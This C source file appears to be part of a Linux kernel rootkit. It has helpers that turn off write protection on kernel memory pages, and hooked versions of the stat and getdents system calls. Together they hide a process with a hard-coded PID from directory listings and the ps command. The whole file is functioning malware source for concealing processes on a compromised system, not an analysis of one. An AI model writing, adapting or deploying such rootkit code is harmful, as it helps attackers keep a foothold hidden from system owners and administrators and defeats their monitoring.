#include "functions.h"

//removing WP to read&write
int set_addr_rw(unsigned long addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(addr, &level);

        if (pte->pte &~ _PAGE_RW) {
                pte->pte |= _PAGE_RW;
        }

        return 0;
}

//return protected mode to read only
int set_addr_ro(unsigned long addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(addr, &level);
        pte->pte = pte->pte &~_PAGE_RW;

        return 0;
}

//Hides proccess from the command- ps
asmlinkage int new_stat(const struct pt_regs *regs) {
    char *path = (char*) regs->di;
    
    if (strstr(path, proc_path) != NULL) {     
	    return -1;
	}

    return (*old_stat)(regs);
}

//
asmlinkage int new_getdents(const struct pt_regs *regs) {

        int ret;

        // the current structure
        struct linux_dirent *curr = (struct linux_dirent*)regs->si;

        int i = 0;

        ret = (*old_getdents)(regs);

	// going threw the entries, looking for our pid
        while (i < ret) {

		// checking if it is our process
                if (!strcmp(curr->d_name, hide_pid)) {

                                // length of this linux_dirent
                                int reclen = curr->d_reclen;
                                char *next = (char*)curr + reclen;
                                int len = (int)regs->si + ret - (uintptr_t)next;
                                memmove(curr, next, len);
                                ret -= reclen;
                                continue;
                }

                i += curr->d_reclen;
                curr = (struct linux_dirent*)((char*)regs->si + i);
        }

        return ret;
}

//declaring path to proccess
void buffer_path_pid(void){
    hide_pid="452";
    strncpy(full_path,pre_path,sizeof(full_path));
    strncat(full_path,hide_pid,sizeof(full_path));
}
